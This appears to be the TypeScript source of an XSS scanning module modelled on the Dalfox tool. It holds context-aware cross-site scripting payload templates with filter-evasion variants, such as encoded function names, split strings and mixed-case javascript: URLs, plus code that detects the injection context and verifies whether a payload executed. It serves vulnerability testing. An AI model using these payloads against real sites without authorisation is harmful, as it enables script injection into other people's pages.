/*---------------------------------------------------------------------------------------------
 *  Copyright (c) HikariSystem. All rights reserved.
 *  Licensed under the MIT License for Dalfox-inspired logic.
 *--------------------------------------------------------------------------------------------*/

/**
 * XSS Payload Engine inspired by Dalfox
 * Contains context-aware injection payloads and evasion primitives.
 */

export interface DalfoxPayloads {
	primitives: string[];
	htmlTemplates: string[];
	attributeTemplates: string[];
	scriptTemplates: string[];
	protocolTemplates: string[];
}

// {JS} will be replaced by a JS primitive. {CLASS} will be replaced by the canary marker.
export const DALFOX_PAYLOADS: DalfoxPayloads = {
	primitives: [
		`alert('{canary}')`,
		`prompt('{canary}')`,
		`confirm('{canary}')`,
		`(()=>alert('{canary}'))()`,
		`window?.alert?.('{canary}')`,
		`setTimeout('ale'+'rt("{canary}")')`,
		`new Function('ale'+'rt("{canary}")')()`,
		`window[atob('YWxlcnQ=')]('{canary}')`,
	],
	htmlTemplates: [
		`<{tag} class={CLASS}>{JS}</{tag}>`,
		`<{tag}/class={CLASS}>{JS}</{tag}>`,
		`<svg><animate onbegin={JS} attributeName=x dur=1s class={CLASS}>`,
		`<dialog open onclose={JS} class={CLASS}>`,
		`<svg/onload={JS}/class={CLASS}>`,
		`<svg><foreignobject><img src=x onerror={JS} class={CLASS}></foreignobject></svg>`,
		`<math><mtext><img src=x onerror={JS} class={CLASS}></mtext></math>`,
	],
	attributeTemplates: [
		`'><img src=x onerror={JS} class={CLASS}>`,
		`" autofocus onfocus={JS} class={CLASS} x="`,
		`' autofocus onfocus={JS} class={CLASS} x='`,
		`\" onerror={JS} class={CLASS} src=x \"`,
	],
	scriptTemplates: [
		`';{JS};//`,
		`";{JS};//`,
		`-{JS}-`,
		`</script><svg/onload={JS} class={CLASS}>`,
	],
	protocolTemplates: [
		`javascript:{JS}`,
		`jAvAsCrIpT:{JS}`,
		`java\nscript:{JS}`,
		`data:text/html,<script class={CLASS}>{JS}</script>`,
	]
};

export type DalfoxContext = 'html' | 'attribute' | 'script' | 'style' | 'event' | 'safe_html' | 'url';

/**
 * Detects the injection context using Dalfox heuristics (regex boundaries and tag tracking).
 */
export function detectDalfoxContext(body: string, canary: string): DalfoxContext {
	const idx = body.indexOf(canary);
	if (idx === -1) { return 'html'; } // Default fallback

	const before = body.substring(Math.max(0, idx - 1000), idx);

	// 1. Script Context Check
	const lastScriptOpen = before.lastIndexOf('<script');
	const lastScriptClose = before.lastIndexOf('</script');
	if (lastScriptOpen > lastScriptClose) {
		return 'script';
	}

	// 2. Style Context Check
	const lastStyleOpen = before.lastIndexOf('<style');
	const lastStyleClose = before.lastIndexOf('</style');
	if (lastStyleOpen > lastStyleClose) {
		return 'style';
	}

	// 3. Safe HTML Contexts (textarea, title, etc. where tags aren't parsed)
	const safeTags = ['textarea', 'title', 'noscript', 'xmp', 'plaintext'];
	for (const tag of safeTags) {
		const open = before.lastIndexOf(`<${tag}`);
		const close = before.lastIndexOf(`</${tag}`);
		if (open > close) {
			return 'safe_html';
		}
	}

	// 4. Attribute or URL Context Check
	const lastLt = before.lastIndexOf('<');
	const lastGt = before.lastIndexOf('>');
	
	// If the last tag opened wasn't closed, we are inside a tag's properties
	if (lastLt > lastGt) {
		// Inside an attribute value
		const attrMatch = before.match(/(href|src|action|formaction|cite|data|manifest|poster|srcset|longdesc|background|usemap|codebase|profile|ping|archive)\s*=\s*["']?[^"'>]*$/i);
		if (attrMatch) {
			return 'url';
		}
		
		const eventMatch = before.match(/\son[a-z]+\s*=\s*["']?[^"'>]*$/i);
		if (eventMatch) {
			return 'event';
		}
		
		return 'attribute';
	}

	return 'html';
}

/**
 * Generates payloads for a specific parameter based on its detected context.
 */
export function generateDalfoxPayloads(context: DalfoxContext, canary: string): string[] {
	const payloads: string[] = [];
	const markerClass = `dlx${canary}`;

	// We mix primitives into templates
	for (const js of DALFOX_PAYLOADS.primitives) {
		const jsCode = js.replace(/\{canary\}/g, canary);
		
		if (context === 'html' || context === 'safe_html') {
			// If safe_html, we must break out of the tag first
			const prefix = context === 'safe_html' ? `</textarea></title></noscript></xmp>` : '';
			
			for (const tpl of DALFOX_PAYLOADS.htmlTemplates) {
				payloads.push(prefix + tpl.replace(/\{JS\}/g, jsCode).replace(/\{CLASS\}/g, markerClass).replace(/\{tag\}/g, 'script'));
				// Try with a non-script tag for WAF evasion
				if (tpl.includes('{tag}')) {
					payloads.push(prefix + tpl.replace(/\{JS\}/g, jsCode).replace(/\{CLASS\}/g, markerClass).replace(/\{tag\}/g, 'style onload=eval(this.innerHTML)'));
				}
			}
		}

		if (context === 'attribute' || context === 'event') {
			for (const tpl of DALFOX_PAYLOADS.attributeTemplates) {
				payloads.push(tpl.replace(/\{JS\}/g, jsCode).replace(/\{CLASS\}/g, markerClass));
			}
		}

		if (context === 'script') {
			for (const tpl of DALFOX_PAYLOADS.scriptTemplates) {
				payloads.push(tpl.replace(/\{JS\}/g, jsCode).replace(/\{CLASS\}/g, markerClass));
			}
		}

		if (context === 'url') {
			for (const tpl of DALFOX_PAYLOADS.protocolTemplates) {
				payloads.push(tpl.replace(/\{JS\}/g, jsCode).replace(/\{CLASS\}/g, markerClass));
			}
		}
	}

	return payloads;
}

/**
 * Verification Engine: Instead of simple substring matching, we check for
 * structural markers and DOM execution traits simulating AST/DOM parses.
 */
export function verifyDalfoxExploit(body: string, payload: string, canary: string, context: DalfoxContext): boolean {
	const markerClass = `dlx${canary}`;

	// 1. Structural HTML Verification (did the payload create an element?)
	// Check if our class marker survived unescaped
	if (payload.includes(markerClass) && body.includes(`class=${markerClass}`) || body.includes(`class="${markerClass}"`) || body.includes(`class='${markerClass}'`)) {
		return true;
	}

	// 2. JS Sink Verification (did the AST successfully parse our JS?)
	// If context is script or event, check if the unescaped alert/prompt/setTimeout call exists
	const rawSinks = [
		`alert('${canary}')`, `prompt('${canary}')`, `confirm('${canary}')`,
		`alert("${canary}")`, `prompt("${canary}")`, `confirm("${canary}")`
	];
	
	if (context === 'script' || context === 'event') {
		for (const sink of rawSinks) {
			if (body.includes(sink)) {
				// Prevent false positive if it's strictly enclosed in quotes (var x = "alert('canary')")
				// We do a basic heuristic: check if the sink is preceded by a quote and followed by a quote.
				const idx = body.indexOf(sink);
				if (idx > 0) {
					const beforeChar = body.charAt(idx - 1);
					const afterChar = body.charAt(idx + sink.length);
					if ((beforeChar === '"' && afterChar === '"') || (beforeChar === "'" && afterChar === "'")) {
						continue; // Trapped in string
					}
				}
				return true;
			}
		}
	}

	// 3. Protocol Verification (URL Context)
	if (context === 'url') {
		// Verify if it starts with javascript: and exists inside an unescaped href/src
		const protocolRegex = new RegExp(`(?:href|src|action|data)\\s*=\\s*["']?\\s*(?:javascript|data|vbscript):[^"'>]*${canary}`, 'i');
		if (protocolRegex.test(body)) {
			return true;
		}
	}

	return false;
}
